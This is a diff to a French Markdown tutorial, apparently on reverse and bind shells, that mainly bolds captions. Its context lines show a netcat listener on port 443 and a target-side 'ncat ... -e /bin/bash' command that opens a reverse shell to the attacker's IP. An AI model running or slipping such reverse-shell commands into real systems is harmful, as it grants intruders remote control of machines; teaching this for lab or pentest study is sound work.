@@ -42,14 +42,14 @@ Notre machine
 user@ip:/home/user $ sudo nc -lvnp 443
 Listening on 0.0.0.0 443
 ```
-Mise en place du listener.
+**Mise en place du listener**.
 
 Machine cible
 
 ```shell
 root@raspberrypi:/# ncat 192.168.1.100 443 -e /bin/bash
 ```
-Execution du script
+**Execution du script**
 
 Notre machine
 
@@ -70,9 +70,7 @@ script.py.save
 Templates
 Videos
 ```
-
-
-
+**Execution de commande sur la machine cible**
 
 ### Bind shell
 
